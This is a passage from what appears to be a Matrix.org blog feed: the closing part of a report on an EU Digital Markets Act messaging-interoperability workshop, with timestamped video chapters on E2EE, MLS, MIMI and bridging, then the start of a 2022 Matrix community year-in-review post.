&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=83s&quot;&gt;01:23&lt;&#x2F;a&gt; Introduction of the panellists&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Interoperable Messaging - Paul Rösler (FAU)&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=190s&quot;&gt;03:10&lt;&#x2F;a&gt; Interoperable end-to-end (E2EE) encryption options (Paul Rösler)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=324s&quot;&gt;05:24&lt;&#x2F;a&gt; Requirements for interoperable E2EE (Paul Rösler)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=562s&quot;&gt;09:22&lt;&#x2F;a&gt; Options for interoperable E2EE (Paul Rösler)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=834s&quot;&gt;13:54&lt;&#x2F;a&gt; Confidentiality, Privacy &amp;amp; Abuse prevention (Paul Rösler)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=1147s&quot;&gt;19:07&lt;&#x2F;a&gt; Group Messaging (Paul Rösler)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;DMA Stakeholder Workshop: Interoperability - Eric Rescorla (Mozilla)&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=1364s&quot;&gt;22:44&lt;&#x2F;a&gt; Learning from QUIC (Mozilla)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=1454s&quot;&gt;24:14&lt;&#x2F;a&gt; E2EE and interoperability (Mozilla)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=1550s&quot;&gt;25:50&lt;&#x2F;a&gt; Key Establishment in a E2EE interoperable system (Mozilla)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=1636s&quot;&gt;27:16&lt;&#x2F;a&gt; Message and media formats in a E2EE interoperable system (Mozilla)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=1710s&quot;&gt;28:30&lt;&#x2F;a&gt; Identity in a E2EE interoperable system (Mozilla)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=1849s&quot;&gt;30:49&lt;&#x2F;a&gt; Multiple gatekeeper scenarios (Mozilla)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=1901s&quot;&gt;31:41&lt;&#x2F;a&gt; Suggested framework for interoperability (Mozilla)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;DMA Stakeholder Workshop: Interoperability - Alissa Cooper (Cisco)&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=2120s&quot;&gt;35:20&lt;&#x2F;a&gt; Discussing how the UX of a DMA compliant product can look like (Cisco)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=2198s&quot;&gt;36:38&lt;&#x2F;a&gt; The use case for enterprise interoperability (Cisco)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=1847s&quot;&gt;30:47&lt;&#x2F;a&gt; Approaches to DMA Compliance (Cisco)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=2637s&quot;&gt;43:57&lt;&#x2F;a&gt; Limits of the per-gatekeeper, in-house solution approach (Cisco)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=2899s&quot;&gt;48:19&lt;&#x2F;a&gt; Strengths of the consolidated (standardised) solution (Cisco)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=3000s&quot;&gt;50:00&lt;&#x2F;a&gt; Implications &amp;amp; requirements of the consolidated solution (Cisco)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Implementing Interoperability for the DMA - Matthew Hodgson (Matrix)&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=3123s&quot;&gt;52:03&lt;&#x2F;a&gt; Implementing Interoperability in practice for the DMA (Matrix)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=3180s&quot;&gt;53:00&lt;&#x2F;a&gt; A practical path to full interoperability (Matrix)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=3275s&quot;&gt;54:35&lt;&#x2F;a&gt; Defining the problem we&#x27;re solving (Matrix)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=3315s&quot;&gt;55:15&lt;&#x2F;a&gt; Approach 1 Client-side bridging using server-side APIs (Matrix)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=3441s&quot;&gt;57:21&lt;&#x2F;a&gt; Approach 2 Client-side bridging using client-side APIs (Matrix)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=3528s&quot;&gt;58:48&lt;&#x2F;a&gt; Approach 3 Polyglot app, using a 3rd party protocol à la iMessage (Matrix)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=3606s&quot;&gt;01:00:06&lt;&#x2F;a&gt; Approach 4 Using an open protocol (Matrix)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=3642s&quot;&gt;01:00:42&lt;&#x2F;a&gt; Pros &amp;amp; Cons of each approach (Matrix)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=3715s&quot;&gt;01:01:55&lt;&#x2F;a&gt; DEMO of client-side bridging (Matrix)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Meta&#x27;s view on the DMA as seen from WhatsApp - Stephen Hurley (Meta)&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=4005s&quot;&gt;01:06:45&lt;&#x2F;a&gt; Meta&#x27;s view on the DMA as seen from WhatsApp (Meta)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Questions&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=4632s&quot;&gt;01:17:12&lt;&#x2F;a&gt; Matthew (Matrix) remind that not only the demo showed client-side bridging was possible, but iMessage has been doing it for years via SMS &amp;amp; iMessage&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=4674s&quot;&gt;01:17:54&lt;&#x2F;a&gt; Meta has two IM platforms (Instagram and Facebook) that are not E2EE. What is Meta going to do about those platforms? (Beeper)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=4725s&quot;&gt;01:18:45&lt;&#x2F;a&gt; How to balance discoverability and privacy?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=4864s&quot;&gt;01:21:04&lt;&#x2F;a&gt; How to solve the problem of different E2EE protocols? (online)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=5088s&quot;&gt;01:24:48&lt;&#x2F;a&gt; Do some of the panellists think the best option is not a single standardised protocol? (OpenXchange)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=5626s&quot;&gt;01:33:46&lt;&#x2F;a&gt; Which measures by gatekeepers to preserve security integrity and privacy can be considered proportionate?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=5798s&quot;&gt;01:36:38&lt;&#x2F;a&gt; How many people have worked on the client-side demo?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=5936s&quot;&gt;01:38:56&lt;&#x2F;a&gt; Does it really matter that MLS is not &amp;quot;done&amp;quot;?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=6450s&quot;&gt;01:47:30&lt;&#x2F;a&gt; How will article 7 ensure private keys will never transit over the network? (online)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=6780s&quot;&gt;01:53:00&lt;&#x2F;a&gt; What about interoperability of features like custom emojis, removing messages, etc? (online)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=7062s&quot;&gt;01:57:42&lt;&#x2F;a&gt; What does the rest of the panel thinks about the guarantees they can provide when a message leaves a system? (XMPP)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;panel-3-exploring-the-technical-aspects-of-interoperability-ii-data-collection-identification-of-users-quality-of-interoperable-services-system-management-integrity-of-the-service-prevention-of-misuse&quot;&gt;Panel 3: Exploring the technical aspects of interoperability (II): data collection, identification of users, quality of interoperable services, system management, integrity of the service&#x2F;prevention of misuse&lt;&#x2F;h3&gt;
&lt;p&gt;Finally, we launched into the third and final session of the day - a second technical panel to dig into questions of identity, usability, data privacy, consent and anti-abuse in a DMA world.  Relative to the second panel, there were more questions than answers here, as the panellists discussed whether users would need to consent or opt-in&#x2F;opt-out of interoperability, and debated the various data privacy implications of DMA.  The panel starred Stephen Hurley from Meta again, &lt;a href=&quot;https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;lucas-verney&quot;&gt;Lucas Verney&lt;&#x2F;a&gt; from &lt;a href=&quot;https:&#x2F;&#x2F;www.peren.gouv.fr&quot;&gt;PEReN&lt;&#x2F;a&gt;, Markus Klein from &lt;a href=&quot;https:&#x2F;&#x2F;www.bundesnetzagentur.de&#x2F;&quot;&gt;Bundesnetzagentur&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;rohan.com&#x2F;&quot;&gt;Rohan Mahy&lt;&#x2F;a&gt; from &lt;a href=&quot;https:&#x2F;&#x2F;wire.com&quot;&gt;Wire&lt;&#x2F;a&gt; introducing the &lt;a href=&quot;https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;group&#x2F;mimi&quot;&gt;MIMI working group&lt;&#x2F;a&gt; at IETF.&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;ZtRmAaHUxWw&quot; title=&quot;DMA &amp;amp; messaging services interoperability - Metadata, cross-certification of users, and UI&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;br&#x2F;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=0s&quot;&gt;00:00&lt;&#x2F;a&gt; Opening and panellists introduction&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Meta &#x2F; WhatsApp&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=141s&quot;&gt;02:21&lt;&#x2F;a&gt; User Safety on WhatsApp&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=411s&quot;&gt;06:51&lt;&#x2F;a&gt; Consenting to interoperability&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=476s&quot;&gt;07:56&lt;&#x2F;a&gt; Objective criteria to assess whether a request is reasonable or not&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;PEReN&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=540s&quot;&gt;09:00&lt;&#x2F;a&gt; PEReN is a French government digital expertise hub&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=612s&quot;&gt;10:12&lt;&#x2F;a&gt; Efficient design for effective interoperability&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=685s&quot;&gt;11:25&lt;&#x2F;a&gt; Reconciliation identity between services&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=820s&quot;&gt;13:40&lt;&#x2F;a&gt; Discoverability between platforms of different scales&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=987s&quot;&gt;16:27&lt;&#x2F;a&gt; Should fancy features (e.g. emoji reactions) be interoperable?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=1042s&quot;&gt;17:22&lt;&#x2F;a&gt; Quality of Service&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=1142s&quot;&gt;19:02&lt;&#x2F;a&gt; Security goes beyond E2EE&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Bundesnetzagentur&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=1226s&quot;&gt;20:26&lt;&#x2F;a&gt; Bundesnetzagentur views on the DMA&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Wire&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=1599s&quot;&gt;26:39&lt;&#x2F;a&gt; Federation and Interoperability issues are similar&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=1690s&quot;&gt;28:10&lt;&#x2F;a&gt; Standards-based interoperability and the MIMI working group&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=1758s&quot;&gt;29:18&lt;&#x2F;a&gt; Identifiers, devices, handles&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=1850s&quot;&gt;30:50&lt;&#x2F;a&gt; User introduction &amp;amp; discovery&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=1890s&quot;&gt;31:30&lt;&#x2F;a&gt; Messaging content&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=2046s&quot;&gt;34:06&lt;&#x2F;a&gt; Why MIMI picked MLS for E2EE?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=2154s&quot;&gt;35:54&lt;&#x2F;a&gt; Server to server transport mechanism&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=2198s&quot;&gt;36:38&lt;&#x2F;a&gt; E2EE Cryptographic identity&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=2340s&quot;&gt;39:00&lt;&#x2F;a&gt; MIMI&#x27;s standardisation work provides a strong foundation for other features&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=2425s&quot;&gt;40:25&lt;&#x2F;a&gt; Why is standardized interoperability beneficial?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Questions&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=2670s&quot;&gt;44:30&lt;&#x2F;a&gt; What about terms of service, minimum usage age enforcement etc?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=2883s&quot;&gt;48:03&lt;&#x2F;a&gt; How can identity be maintained separately from networks? How will differing policies of services be respected?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=3146s&quot;&gt;52:26&lt;&#x2F;a&gt; Does WhatsApp rely on the phone number as a primary identifier?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=3209s&quot;&gt;53:29&lt;&#x2F;a&gt; Some systems like Telegram have pseudonymous IDs. How would that work with platforms relying on e.g. phone numbers?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=3342s&quot;&gt;55:42&lt;&#x2F;a&gt; Should the service name be part of the identifier?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=3453s&quot;&gt;57:33&lt;&#x2F;a&gt; Can the DMA improve how authentication is handled?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=3591s&quot;&gt;59:51&lt;&#x2F;a&gt; What made the GDPR successful is the potential fines. What about the DMA?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=3828s&quot;&gt;01:03:48&lt;&#x2F;a&gt; How can interoperability be designed to stop leaking contact lists?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=4155s&quot;&gt;01:09:15&lt;&#x2F;a&gt; Are we doing cookie banners again?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=4557s&quot;&gt;01:15:57&lt;&#x2F;a&gt; Should we think about some integration with eIDAS for more trustworthy identities?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=4788s&quot;&gt;01:19:48&lt;&#x2F;a&gt; Are all the protocols like Matrix or MIMI free to use, or do they have a fee?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=4952s&quot;&gt;01:22:32&lt;&#x2F;a&gt; Are there really concerns about the DMA and security?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=5260s&quot;&gt;01:27:40&lt;&#x2F;a&gt; Does Meta expect to provide a EU-only and a global version of their messengers?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=5395s&quot;&gt;01:29:55&lt;&#x2F;a&gt; The views expressed here regarding consent are concerning when it comes to self-hosting&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZtRmAaHUxWw&amp;amp;t=5780s&quot;&gt;01:36:20&lt;&#x2F;a&gt; Closing&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;&#x2F;h2&gt;
&lt;p&gt;This was a fascinating opportunity to have a front-row seat at history being made, as the various key players finally got down to business on the practical implications of DMA interoperability.&lt;&#x2F;p&gt;
&lt;p&gt;We saw the full spectrum of options on the table, from Meta’s implications that they would simply open their existing API complete with the existing Double Ratchet Encryption, to the pragmatic approach of Matrix (“at first we’ll bridge, and then the players should gradually converge on an open standard”) to the more idealistic approach of MIMI (“everyone should natively adopt an entirely new open standard built on MLS”).  The next step is to establish a reference implementation and approach, and in the end it seems likely that the approach that works will be the one which the gatekeepers can actually practically adopt within the punchy timeframes built into the legislation:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;dma.jpg&quot; alt=&quot;DMA timeline&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;You can also check out &lt;a href=&quot;https:&#x2F;&#x2F;carlschwan.eu&#x2F;2023&#x2F;03&#x2F;02&#x2F;digital-market-act-workshop-in-brussels&#x2F;&quot;&gt;Carl Schwan’s writeup&lt;&#x2F;a&gt; (from NeoChat), as well as Eric Rescorla’s braindump on &lt;a href=&quot;https:&#x2F;&#x2F;educatedguesswork.org&#x2F;posts&#x2F;dma-interop&#x2F;&quot;&gt;DMA interoperability&lt;&#x2F;a&gt; that accompanies his talk.&lt;&#x2F;p&gt;
&lt;p&gt;We live in interesting times, and it’s fascinating to see Matrix’s vision of interoperable communication being cemented into regulation by the EU.  Our view is that as long as the gatekeepers open their APIs and add support to model remote users in their systems, then at least the wider world can implement client-side bridges to crack the door of the gatekeepers open - and then as gatekeepers refresh their stacks and new players emerge, they’ll likely implement the common protocol (if it’s fit for purpose) rather than burn time reinventing the wheel on proprietary solutions.  Meanwhile, the DMA provides welcome encouragement to ensure that open protocols like Matrix can rise to the challenge and fill the gap - whether that’s &lt;a href=&quot;https:&#x2F;&#x2F;spec.matrix.org&quot;&gt;independently&lt;&#x2F;a&gt; or as &lt;a href=&quot;https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;draft-ralston-mimi-matrix-framework&#x2F;&quot;&gt;part of IETF’s MIMI&lt;&#x2F;a&gt; initiative. May the best solution win!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix Community Year In Review 2022</title>
        <published>2023-01-03T00:00:00+00:00</published>
        <updated>2023-01-03T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2023/01/03/matrix-community-year-in-review-2022/" type="text/html"/>
        <id>https://matrix.org/blog/2023/01/03/matrix-community-year-in-review-2022/</id>
        
        <content type="html">&lt;blockquote&gt;
&lt;p&gt;Note: This was originally posted on https:&#x2F;&#x2F;blog.neko.dev&#x2F;posts&#x2F;matrix-year-in-review-2022.html , which also includes some small info boxes about each projects, which got lost in the translation.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;As we send off 2022 with a bang, it makes sense to look back on what we did this year and where we want to go next year. In its holiday special post, the Matrix Foundation has been focusing on the core team&#x27;s work. This post is focusing on the achievements of the community outside of the Matrix Foundation.&lt;&#x2F;p&gt;
&lt;p&gt;I tried to reach out to as many people I have seen do &amp;quot;stuff&amp;quot; on Matrix and have them write something they would see fitting for a year in review. Now, most people have better things to do between christmas and new years, so I hope you can excuse if some projects are missing. Also I probably forgot like half of the interesting people... HOWEVER! I hope you still enjoy what everyone wrote up. And don&#x27;t forget to check out the official &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;12&#x2F;25&#x2F;the-matrix-holiday-update-2022&quot;&gt;Matrix Holiday Update 2022&lt;&#x2F;a&gt; and of course read you weekly &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;category&#x2F;this-week-in-matrix&quot;&gt;TWIM&lt;&#x2F;a&gt; to keep up to date with any cool projects you find.&lt;&#x2F;p&gt;
&lt;h2&gt;Nheko D-Bus API&lt;&#x2F;h2&gt;
&lt;p&gt;A D-Bus API for the Nheko Matrix client compatible with KRunner and Rofi.&lt;&#x2F;p&gt;
&lt;p&gt;LorenDB tells us&lt;&#x2F;p&gt;&lt;blockquote&gt;
